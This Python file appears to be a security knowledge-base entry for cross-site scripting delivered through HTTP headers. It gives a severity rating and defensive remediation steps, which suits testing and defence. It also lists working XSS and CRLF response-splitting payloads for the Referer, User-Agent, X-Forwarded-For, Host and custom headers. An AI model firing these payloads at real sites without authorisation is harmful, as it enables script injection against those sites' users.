#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: HTTP Header Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via HTTP Headers",
    "severity": "high",
    "cvss_score": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-113"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "headers", "crlf", "http-injection", "referer", "user-agent"],
    "description": """
XSS through HTTP headers occurs when user-controlled header values are reflected in responses
without proper sanitization. Common vectors include Referer, User-Agent, X-Forwarded-For,
and custom headers.

SEVERITY: HIGH
Header injection can bypass input validation focused only on GET/POST parameters.
Often leads to CRLF injection which enables header manipulation and response splitting.
""",
    "attack_vector": """
REFERER INJECTION:
Referer: <script>alert(1)</script>

USER-AGENT XSS:
User-Agent: <img src=x onerror=alert(1)>

X-FORWARDED-FOR:
X-Forwarded-For: <script>alert(1)</script>

CRLF + XSS:
Host: example.com%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert(1)</script>

CUSTOM HEADER REFLECTION:
X-Custom: "><img src=x onerror=alert(1)>

HOST HEADER INJECTION:
Host: evil.com"><script>alert(1)</script>

ACCEPT-LANGUAGE:
Accept-Language: <script>alert(1)</script>

X-ORIGINAL-URL (Nginx):
X-Original-URL: /<script>alert(1)</script>
""",
    "remediation": """
DEFENSE:

1. SANITIZE ALL HEADER VALUES before reflection
2. Encode special characters in header output
3. Validate header format strictly
4. Use Content-Security-Policy
5. Set X-Content-Type-Options: nosniff
6. Never trust Referer/User-Agent values
7. Filter CRLF characters (\\r\\n)

SERVER CONFIG:
# Nginx
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
# Validate before use in application

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-113: HTTP Response Splitting
""",
}
